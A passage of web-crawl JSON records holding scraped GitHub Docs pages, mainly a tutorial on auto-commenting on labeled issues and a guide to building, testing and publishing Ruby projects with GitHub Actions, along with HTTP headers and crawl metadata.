        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/project-management/commenting-on-an-issue-when-a-label-is-added"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/project-management/commenting-on-an-issue-when-a-label-is-added"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "9B00:148852:1A383:20E3C:681C51B4",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "date": "Thu, 08 May 2025 06:39:48 GMT",
      "via": "1.1 varnish",
      "age": "0",
      "x-served-by": "cache-yyz4556-YYZ",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686388.277576, VS0, VE396",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "26745",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Commenting on an issue when a label is added\nYou can use GitHub Actions to automatically comment on issues when a specific label is applied.\nIntroduction\nThis tutorial demonstrates how to use the GitHub CLI to comment on an issue when a specific label is applied. For example, when the help wanted label is added to an issue, you can add a comment to encourage contributors to work on the issue. For more information about GitHub CLI, see Using GitHub CLI in workflows.\nIn the tutorial, you will first make a workflow file that uses the gh issue comment command to comment on an issue. Then, you will customize the workflow to suit your needs.\nCreating the workflow\nChoose a repository where you want to apply this project management workflow. You can use an existing repository that you have write access to, or you can create a new repository. For more information about creating a repository, see Creating a new repository.\nIn your repository, create a file called .github/workflows/YOUR_WORKFLOW.yml, replacing YOUR_WORKFLOW with a name of your choice. This is a workflow file. For more information about creating new files on GitHub, see Creating new files.\nCopy the following YAML contents into your workflow file.\nYAML\nname: Add comment on: issues: types: - labeled jobs: add-comment: if: github.event.label.name == 'help wanted' runs-on: ubuntu-latest permissions: issues: write steps: - name: Add comment run: gh issue comment \"$NUMBER\" --body \"$BODY\" env: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} GH_REPO: ${{ github.repository }} NUMBER: ${{ github.event.issue.number }} BODY: > This issue is available for anyone to work on. **Make sure to reference this issue in your pull request.** :sparkles: Thank you for your contribution! :sparkles: \nCustomize the parameters in your workflow file:\nReplace help wanted in if: github.event.label.name == 'help wanted' with the label that you want to act on. If you want to act on more than one label, separate the conditions with ||. For example, if: github.event.label.name == 'bug' || github.event.label.name == 'fix me' will comment whenever the bug or fix me labels are added to an issue.\nChange the value for BODY to the comment that you want to add. GitHub flavored markdown is supported. For more information about markdown, see Basic writing and formatting syntax.\nCommit your workflow file to the default branch of your repository. For more information, see Creating new files.\nTesting the workflow\nEvery time an issue in your repository is labeled, this workflow will run. If the label that was added is one of the labels that you specified in your workflow file, the gh issue comment command will add the comment that you specified to the issue.\nTest your workflow by applying your specified label to an issue.\nOpen an issue in your repository. For more information, see Creating an issue.\nLabel the issue with the specified label in your workflow file. For more information, see Managing labels.\nTo see the workflow run triggered by labeling the issue, view the history of your workflow runs. For more information, see Viewing workflow run history.\nWhen the workflow completes, the issue that you labeled should have a comment added.\nNext steps\nTo learn more about additional things you can do with the GitHub CLI, like editing existing comments, visit the GitHub CLI Manual.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-commenting-on-an-issue-when-a-label-is-added-4f58a.html",
  "markdown": "# Commenting on an issue when a label is added\n\nYou can use GitHub Actions to automatically comment on issues when a specific label is applied.\n\n## [Introduction](#introduction)\n\nThis tutorial demonstrates how to use the GitHub CLI to comment on an issue when a specific label is applied. For example, when the `help wanted` label is added to an issue, you can add a comment to encourage contributors to work on the issue. For more information about GitHub CLI, see [Using GitHub CLI in workflows](https://docs.github.com/en/actions/using-workflows/using-github-cli-in-workflows).\n\nIn the tutorial, you will first make a workflow file that uses the `gh issue comment` command to comment on an issue. Then, you will customize the workflow to suit your needs.\n\n## [Creating the workflow](#creating-the-workflow)\n\n1.  Choose a repository where you want to apply this project management workflow. You can use an existing repository that you have write access to, or you can create a new repository. For more information about creating a repository, see [Creating a new repository](https://docs.github.com/en/repositories/creating-and-managing-repositories/creating-a-new-repository).\n    \n2.  In your repository, create a file called `.github/workflows/YOUR_WORKFLOW.yml`, replacing `YOUR_WORKFLOW` with a name of your choice. This is a workflow file. For more information about creating new files on GitHub, see [Creating new files](https://docs.github.com/en/repositories/working-with-files/managing-files/creating-new-files).\n    \n3.  Copy the following YAML contents into your workflow file.\n    \n    YAML\n    \n    ```\n    name: Add comment\n    on:\n      issues:\n        types:\n          - labeled\n    jobs:\n      add-comment:\n        if: github.event.label.name == 'help wanted'\n        runs-on: ubuntu-latest\n        permissions:\n          issues: write\n        steps:\n          - name: Add comment\n            run: gh issue comment \"$NUMBER\" --body \"$BODY\"\n            env:\n              GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n              GH_REPO: ${{ github.repository }}\n              NUMBER: ${{ github.event.issue.number }}\n              BODY: >\n                This issue is available for anyone to work on.\n                **Make sure to reference this issue in your pull request.**\n                :sparkles: Thank you for your contribution! :sparkles:\n    ```\n    \n4.  Customize the parameters in your workflow file:\n    \n    *   Replace `help wanted` in `if: github.event.label.name == 'help wanted'` with the label that you want to act on. If you want to act on more than one label, separate the conditions with `||`. For example, `if: github.event.label.name == 'bug' || github.event.label.name == 'fix me'` will comment whenever the `bug` or `fix me` labels are added to an issue.\n    *   Change the value for `BODY` to the comment that you want to add. GitHub flavored markdown is supported. For more information about markdown, see [Basic writing and formatting syntax](https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax).\n5.  Commit your workflow file to the default branch of your repository. For more information, see [Creating new files](https://docs.github.com/en/repositories/working-with-files/managing-files/creating-new-files).\n    \n\n## [Testing the workflow](#testing-the-workflow)\n\nEvery time an issue in your repository is labeled, this workflow will run. If the label that was added is one of the labels that you specified in your workflow file, the `gh issue comment` command will add the comment that you specified to the issue.\n\nTest your workflow by applying your specified label to an issue.\n\n1.  Open an issue in your repository. For more information, see [Creating an issue](https://docs.github.com/en/issues/tracking-your-work-with-issues/creating-an-issue).\n2.  Label the issue with the specified label in your workflow file. For more information, see [Managing labels](https://docs.github.com/en/issues/using-labels-and-milestones-to-track-work/managing-labels#applying-labels-to-issues-and-pull-requests).\n3.  To see the workflow run triggered by labeling the issue, view the history of your workflow runs. For more information, see [Viewing workflow run history](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/viewing-workflow-run-history).\n4.  When the workflow completes, the issue that you labeled should have a comment added.\n\n## [Next steps](#next-steps)\n\n*   To learn more about additional things you can do with the GitHub CLI, like editing existing comments, visit the [GitHub CLI Manual](https://cli.github.com/manual/).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 244,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-commenting-on-an-issue-when-a-label-is-added-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-commenting-on-an-issue-when-a-label-is-added-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-commenting-on-an-issue-when-a-label-is-added-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-commenting-on-an-issue-when-a-label-is-added-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-commenting-on-an-issue-when-a-label-is-added-readableTextIfPossibleHtmlUr"
    },
    "lengths": {
      "extractus": 6527,
      "readableText": 6030,
      "none": 27817,
      "readableTextIfPossible": 27817,
      "result": 6030,
      "markdown": 4697
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/writing-workflows",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/writing-workflows",
    "loadedTime": "2025-05-08T06:39:56.855Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/writing-workflows",
    "title": "Writing workflows - GitHub Docs",
    "description": "GitHub Actions workflows can automate tasks throughout the software development lifecycle.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Writing workflows - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "8398:148852:1A40D:20EF9:681C517F",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:39:48 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-yyz4556-YYZ",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686389.622936, VS0, VE309",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "23842",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Writing workflows - GitHub Docs\nGitHub Actions workflows can automate tasks throughout the software development lifecycle.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-tif39.html",
  "markdown": "# Writing workflows - GitHub Docs\n\nGitHub Actions workflows can automate tasks throughout the software development lifecycle.",
  "debug": {
    "pageType": "Category",
    "pageTypeReason": "None",
    "totalLinks": 251,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-removedElementsHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 0,
      "readableText": 326,
      "none": 32276,
      "readableTextIfPossible": 32276,
      "result": 326,
      "markdown": 125
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby",
    "loadedTime": "2025-05-08T06:39:57.006Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby",
    "title": "Building and testing Ruby - GitHub Docs",
    "description": "You can create a continuous integration (CI) workflow to build and test your Ruby project.",
    "author": null,
    "keywords": "CI,Ruby",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Building and testing Ruby - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "B9DE:148852:1A33E:20DF5:681C51B4",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:39:48 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-yyz4556-YYZ",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686388.172966, VS0, VE499",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "30475",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Building and testing Ruby - GitHub Docs\nYou can create a continuous integration (CI) workflow to build and test your Ruby project.\nIntroduction\nThis guide shows you how to create a continuous integration (CI) workflow that builds and tests a Ruby application. If your CI tests pass, you may want to deploy your code or publish a gem.\nPrerequisites\nWe recommend that you have a basic understanding of Ruby, YAML, workflow configuration options, and how to create a workflow file. For more information, see:\nLearn GitHub Actions\nRuby in 20 minutes\nUsing a Ruby workflow template\nTo get started quickly, add a workflow template to the .github/workflows directory of your repository.\nGitHub provides a workflow template for Ruby that should work for most Ruby projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIf you already have a workflow in your repository, click New workflow.\nThe \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"ruby\".\nFilter the selection of workflows by clicking Continuous integration.\nOn the \"Ruby\" workflow, click Configure.\nEdit the workflow as required. For example, change the Ruby versions you want to use.\nNote\nThis workflow template contains an action that is not certified by GitHub. Actions provided by third parties are governed by separate terms of service, privacy policy, and support documentation.\nIf you use actions from third parties you should use a version specified by a commit SHA. If the action is revised and you want to use the newer version, you will need to update the SHA. You can specify a version by referencing a tag or a branch, however the action may change without warning. For more information, see Security hardening for GitHub Actions.\nClick Commit changes.\nThe ruby.yml workflow file is added to the .github/workflows directory of your repository.\nSpecifying the Ruby version\nThe easiest way to specify a Ruby version is by using the ruby/setup-ruby action provided by the Ruby organization on GitHub. The action adds any supported Ruby version to PATH for each job run in a workflow. For more information and available Ruby versions, see ruby/setup-ruby.\nUsing Ruby's ruby/setup-ruby action is the recommended way of using Ruby with GitHub Actions because it ensures consistent behavior across different runners and different versions of Ruby.\nThe setup-ruby action takes a Ruby version as an input and configures that version on the runner.\nsteps: - uses: actions/checkout@v4 - uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1 with: ruby-version: '3.1' # Not needed with a .ruby-version file - run: bundle install - run: bundle exec rake \nAlternatively, you can check a .ruby-version file into the root of your repository and setup-ruby will use the version defined in that file.\nTesting with multiple versions of Ruby\nYou can add a matrix strategy to run your workflow with more than one version of Ruby. For example, you can test your code against the latest patch releases of versions 3.1, 3.0, and 2.7.\nstrategy: matrix: ruby-version: ['3.1', '3.0', '2.7'] \nEach version of Ruby specified in the ruby-version array creates a job that runs the same steps. The ${{ matrix.ruby-version }} context is used to access the current job's version. For more information about matrix strategies and contexts, see Workflow syntax for GitHub Actions and Accessing contextual information about workflow runs.\nThe full updated workflow with a matrix strategy could look like this:\n# This workflow uses actions that are not certified by GitHub. # They are provided by a third-party and are governed by # separate terms of service, privacy policy, and support # documentation. # GitHub recommends pinning actions to a commit SHA. # To get a newer version, you will need to update the SHA. # You can also reference a tag or branch, but the action may change without warning. name: Ruby CI on: push: branches: [ main ] pull_request: branches: [ main ] jobs: test: runs-on: ubuntu-latest strategy: matrix: ruby-version: ['3.1', '3.0', '2.7'] steps: - uses: actions/checkout@v4 - name: Set up Ruby ${{ matrix.ruby-version }} uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1 with: ruby-version: ${{ matrix.ruby-version }} - name: Install dependencies run: bundle install - name: Run tests run: bundle exec rake \nInstalling dependencies with Bundler\nThe setup-ruby action will automatically install bundler for you. The version is determined by your gemfile.lock file. If no version is present in your lockfile, then the latest compatible version will be installed.\nsteps: - uses: actions/checkout@v4 - uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1 with: ruby-version: '3.1' - run: bundle install \nCaching dependencies\nThe setup-ruby actions provides a method to automatically handle the caching of your gems between runs.\nTo enable caching, set the following.\nsteps: - uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1 with: bundler-cache: true \nThis will configure bundler to install your gems to vendor/cache. For each successful run of your workflow, this folder will be cached by GitHub Actions and re-downloaded for subsequent workflow runs. A hash of your gemfile.lock and the Ruby version are used as the cache key. If you install any new gems, or change a version, the cache will be invalidated and bundler will do a fresh install.\nCaching without setup-ruby\nFor greater control over caching, you can use the actions/cache action directly. For more information, see Caching dependencies to speed up workflows.\nsteps: - uses: actions/cache@v4 with: path: vendor/bundle key: ${{ runner.os }}-gems-${{ hashFiles('**/Gemfile.lock') }} restore-keys: | ${{ runner.os }}-gems- - name: Bundle install run: | bundle config path vendor/bundle bundle install --jobs 4 --retry 3 \nIf you're using a matrix build, you will want to include the matrix variables in your cache key. For example, if you have a matrix strategy for different ruby versions (matrix.ruby-version) and different operating systems (matrix.os), your workflow steps might look like this:\nsteps: - uses: actions/cache@v4 with: path: vendor/bundle key: bundle-use-ruby-${{ matrix.os }}-${{ matrix.ruby-version }}-${{ hashFiles('**/Gemfile.lock') }} restore-keys: | bundle-use-ruby-${{ matrix.os }}-${{ matrix.ruby-version }}- - name: Bundle install run: | bundle config path vendor/bundle bundle install --jobs 4 --retry 3 \nMatrix testing your code\nThe following example matrix tests all stable releases and head versions of MRI, JRuby and TruffleRuby on Ubuntu and macOS.\n# This workflow uses actions that are not certified by GitHub. # They are provided by a third-party and are governed by # separate terms of service, privacy policy, and support # documentation. # GitHub recommends pinning actions to a commit SHA. # To get a newer version, you will need to update the SHA. # You can also reference a tag or branch, but the action may change without warning. name: Matrix Testing on: push: branches: [ main ] pull_request: branches: [ main ] jobs: test: runs-on: ${{ matrix.os }}-latest strategy: fail-fast: false matrix: os: [ubuntu, macos] ruby: [2.5, 2.6, 2.7, head, debug, jruby, jruby-head, truffleruby, truffleruby-head] continue-on-error: ${{ endsWith(matrix.ruby, 'head') || matrix.ruby == 'debug' }} steps: - uses: actions/checkout@v4 - uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1 with: ruby-version: ${{ matrix.ruby }} - run: bundle install - run: bundle exec rake \nLinting your code\nThe following example installs rubocop and uses it to lint all files. For more information, see RuboCop. You can configure Rubocop to decide on the specific linting rules.\n# This workflow uses actions that are not certified by GitHub. # They are provided by a third-party and are governed by # separate terms of service, privacy policy, and support # documentation. # GitHub recommends pinning actions to a commit SHA. # To get a newer version, you will need to update the SHA. # You can also reference a tag or branch, but the action may change without warning. name: Linting on: [push] jobs: test: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1 with: ruby-version: '2.6' - run: bundle install - name: Rubocop run: rubocop -f github \nSpecifying -f github means that the RuboCop output will be in GitHub's annotation format. Any linting errors will show inline in the Files changed tab of the pull request that introduces them.\nPublishing Gems\nYou can configure your workflow to publish your Ruby package to any package registry you'd like when your CI tests pass.\nYou can store any access tokens or credentials needed to publish your package using repository secrets. The following example creates and publishes a package to GitHub Package Registry and RubyGems.\n# This workflow uses actions that are not certified by GitHub. # They are provided by a third-party and are governed by # separate terms of service, privacy policy, and support # documentation. # GitHub recommends pinning actions to a commit SHA. # To get a newer version, you will need to update the SHA. # You can also reference a tag or branch, but the action may change without warning. name: Ruby Gem on: # Manually publish workflow_dispatch: # Alternatively, publish whenever changes are merged to the `main` branch. push: branches: [ main ] pull_request: branches: [ main ] jobs: build: name: Build + Publish runs-on: ubuntu-latest permissions: packages: write contents: read steps: - uses: actions/checkout@v4 - name: Set up Ruby 2.6 uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1 with: ruby-version: '2.6' - run: bundle install - name: Publish to GPR run: | mkdir -p $HOME/.gem touch $HOME/.gem/credentials chmod 0600 $HOME/.gem/credentials printf -- \"---\\n:github: ${GEM_HOST_API_KEY}\\n\" > $HOME/.gem/credentials gem build *.gemspec gem push --KEY github --host https://rubygems.pkg.github.com/${OWNER} *.gem env: GEM_HOST_API_KEY: \"Bearer ${{secrets.GITHUB_TOKEN}}\" OWNER: ${{ github.repository_owner }} - name: Publish to RubyGems run: | mkdir -p $HOME/.gem touch $HOME/.gem/credentials chmod 0600 $HOME/.gem/credentials printf -- \"---\\n:rubygems_api_key: ${GEM_HOST_API_KEY}\\n\" > $HOME/.gem/credentials gem build *.gemspec gem push *.gem env: GEM_HOST_API_KEY: \"${{secrets.RUBYGEMS_AUTH_TOKEN}}\"",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-ruby-wgnyo.html",
  "markdown": "# Building and testing Ruby - GitHub Docs\n\nYou can create a continuous integration (CI) workflow to build and test your Ruby project.\n\n## [Introduction](#introduction)\n\nThis guide shows you how to create a continuous integration (CI) workflow that builds and tests a Ruby application. If your CI tests pass, you may want to deploy your code or publish a gem.\n\n## [Prerequisites](#prerequisites)\n\nWe recommend that you have a basic understanding of Ruby, YAML, workflow configuration options, and how to create a workflow file. For more information, see:\n\n*   [Learn GitHub Actions](https://docs.github.com/en/actions/learn-github-actions)\n*   [Ruby in 20 minutes](https://www.ruby-lang.org/en/documentation/quickstart/)\n\n## [Using a Ruby workflow template](#using-a-ruby-workflow-template)\n\nTo get started quickly, add a workflow template to the `.github/workflows` directory of your repository.\n\nGitHub provides a workflow template for Ruby that should work for most Ruby projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  If you already have a workflow in your repository, click **New workflow**.\n    \n4.  The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"ruby\".\n    \n5.  Filter the selection of workflows by clicking **Continuous integration**.\n    \n6.  On the \"Ruby\" workflow, click **Configure**.\n    \n7.  Edit the workflow as required. For example, change the Ruby versions you want to use.\n    \n    Note\n    \n    *   This workflow template contains an action that is not certified by GitHub. Actions provided by third parties are governed by separate terms of service, privacy policy, and support documentation.\n    *   If you use actions from third parties you should use a version specified by a commit SHA. If the action is revised and you want to use the newer version, you will need to update the SHA. You can specify a version by referencing a tag or a branch, however the action may change without warning. For more information, see [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions).\n    \n8.  Click **Commit changes**.\n    \n    The `ruby.yml` workflow file is added to the `.github/workflows` directory of your repository.\n    \n\n## [Specifying the Ruby version](#specifying-the-ruby-version)\n\nThe easiest way to specify a Ruby version is by using the `ruby/setup-ruby` action provided by the Ruby organization on GitHub. The action adds any supported Ruby version to `PATH` for each job run in a workflow. For more information and available Ruby versions, see [`ruby/setup-ruby`](https://github.com/ruby/setup-ruby).\n\nUsing Ruby's `ruby/setup-ruby` action is the recommended way of using Ruby with GitHub Actions because it ensures consistent behavior across different runners and different versions of Ruby.\n\nThe `setup-ruby` action takes a Ruby version as an input and configures that version on the runner.\n\n```\nsteps:\n- uses: actions/checkout@v4\n- uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n  with:\n    ruby-version: '3.1' # Not needed with a .ruby-version file\n- run: bundle install\n- run: bundle exec rake\n```\n\nAlternatively, you can check a `.ruby-version` file into the root of your repository and `setup-ruby` will use the version defined in that file.\n\n## [Testing with multiple versions of Ruby](#testing-with-multiple-versions-of-ruby)\n\nYou can add a matrix strategy to run your workflow with more than one version of Ruby. For example, you can test your code against the latest patch releases of versions 3.1, 3.0, and 2.7.\n\n```\nstrategy:\n  matrix:\n    ruby-version: ['3.1', '3.0', '2.7']\n```\n\nEach version of Ruby specified in the `ruby-version` array creates a job that runs the same steps. The `${{ matrix.ruby-version }}` context is used to access the current job's version. For more information about matrix strategies and contexts, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions) and [Accessing contextual information about workflow runs](https://docs.github.com/en/actions/learn-github-actions/contexts).\n\nThe full updated workflow with a matrix strategy could look like this:\n\n```\n# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Ruby CI\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  test:\n\n    runs-on: ubuntu-latest\n\n    strategy:\n      matrix:\n        ruby-version: ['3.1', '3.0', '2.7']\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Set up Ruby ${{ matrix.ruby-version }}\n        uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: ${{ matrix.ruby-version }}\n      - name: Install dependencies\n        run: bundle install\n      - name: Run 